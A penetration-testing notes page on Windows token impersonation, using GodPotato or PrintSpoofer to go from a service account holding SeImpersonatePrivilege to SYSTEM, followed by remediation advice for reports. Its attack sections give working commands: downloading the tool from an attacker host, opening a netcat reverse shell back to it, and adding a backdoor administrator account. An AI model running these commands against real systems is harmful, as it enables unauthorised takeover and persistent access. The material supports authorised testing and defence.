# Token Impersonation

Full tool syntax: [PrintSpoofer & Potato Attacks](../../tools/printspoofer-potatoes.md)

---

## Privileges Required

| Phase | Account / Privilege | Why |
|---|---|---|
| **Setup** - land on the target as the right kind of account | A service account that **already holds `SeImpersonatePrivilege`** (e.g. `IIS APPPOOL\*`, `NT AUTHORITY\NETWORK SERVICE`, `NT AUTHORITY\LOCAL SERVICE`, `mssql$`, `jenkins`) | You can't grant yourself SeImpersonate from nothing - you have to land in an account that already has it. A normal-user shell will not work for this attack |
| **Exploit** - run PrintSpoofer / GodPotato / RoguePotato | **`SeImpersonatePrivilege` on the current token** | The tool calls `CoGetInstanceFromIStorage` / DCOM RPC tricks that require this exact privilege |
| **Result** | **NT AUTHORITY\SYSTEM** | One-shot escalation from any SeImpersonate-bearing service account |

**Get there:** SeImpersonate is the privesc - you don't escalate *to* it, you find it on the account you already landed as. Typical entry points: IIS web app RCE (PHP/ASPX upload), MSSQL `xp_cmdshell`, Jenkins script console, exposed services running as a service account. If your current shell is a normal user, see [Windows PrivEsc](../../post-exploitation/windows-privesc.md) for other Windows escalation routes (unquoted service paths, AlwaysInstallElevated, AutoLogon creds, etc.) - most of those don't go through SeImpersonate at all.

---

## Can You Do This Remotely From Kali?

**Short answer: No - not directly.**

Token impersonation requires code running ON the target machine. You cannot call PrintSpoofer or GodPotato from Kali over the network.

**What you actually do:**

```
Get any shell on target (low-priv is fine)
    v
Check: whoami /priv -> SeImpersonatePrivilege = Enabled?
    v
Upload GodPotato/PrintSpoofer from Kali via HTTP
    v
Run it through your existing shell -> get SYSTEM
```

Your Kali controls the whole thing - you are just running the tool through your shell session rather than running it natively on Kali. The distinction is where the binary executes.

---

## What Triggers This Opportunity

You land a shell as one of these account types -> they almost always have SeImpersonatePrivilege:

| Account | Where you find it |
|---|---|
| `IIS APPPOOL\*` | Exploiting an IIS web app |
| `NT AUTHORITY\NETWORK SERVICE` | Service exploits, some web apps |
| `NT AUTHORITY\LOCAL SERVICE` | Various Windows services |
| `mssql` service account | MSSQL xp_cmdshell execution |
| `jenkins` | Jenkins script console RCE |

These accounts can impersonate users connecting to them - that is by design. Potato attacks abuse this to impersonate SYSTEM instead.

---

## Attack Flow

```sh
# 1. Check privilege in your shell
whoami /priv
# SeImpersonatePrivilege ... Enabled <- you're good

# 2. Start HTTP server on Kali
python3 -m http.server 8080

# 3. Download GodPotato to target (in your shell)
iwr -uri http://<KALI-IP>:8080/GodPotato.exe -OutFile C:\temp\GodPotato.exe

# 4. Run it
.\GodPotato.exe -cmd "cmd /c whoami"
# Output: nt authority\system

# 5. Get a SYSTEM reverse shell back to Kali
# First: nc -lvnp 9001  <- on Kali
.\GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe <KALI-IP> 9001"
```

---

## Remote Techniques (No Binary on Target Needed)

| Technique | How it works |
|---|---|
| **Pass the Hash** | Send NTLM hash over network - no binary needed on target |
| **Pass the Ticket** | Send Kerberos ticket over network - no binary needed |
| **Kerberoasting** | Request TGS ticket from DC via network - crack offline |
| **DCSync** | Mimics DC replication over network - but needs DA rights |

---

## After Getting SYSTEM

```cmd
# Dump local hashes
.\GodPotato.exe -cmd "cmd /c whoami"    # confirm SYSTEM first

# Add user, dump SAM, get stable shell
net user hacker Pa33w0rd! /add
net localgroup administrators hacker /add

# Now RDP or WinRM in as your new admin user
evil-winrm -i <ip> -u hacker -p Pa33w0rd!
```

---

## Remediation (For Report Writing)

**Root cause:** `SeImpersonatePrivilege` exists by design for service accounts - IIS, MSSQL, and similar services legitimately need to impersonate the connecting user. The vulnerability is that potato attacks abuse this legitimate privilege to impersonate SYSTEM instead of just the intended user.

| Finding | Remediation |
|---|---|
| SeImpersonatePrivilege on service accounts | This is difficult to fully remove - IIS and SQL genuinely need it. The fix is ensuring these accounts have **no other unnecessary privileges** and are isolated (no domain rights, no local admin on other machines). |
| IIS / SQL shell leads directly to SYSTEM via potato | **Virtual accounts** (`IIS APPPOOL\AppName`) are already isolated - they cannot authenticate to the network. Ensure IIS app pools use virtual accounts, not domain service accounts. |
| GodPotato works on the system | **Patch** - GodPotato relies on specific COM interfaces. Windows 11 / Server 2022 with current patches have mitigations. Older OS: prioritize patching or isolate the machine. |
| Service account has domain privileges | Remove all domain privileges from service accounts running web apps or SQL. |

**Key point for reports:** SeImpersonatePrivilege -> SYSTEM is a one-step escalation with no detection by most AV/EDR. The real fix is least privilege on service accounts and network isolation - not just patching individual potato variants.
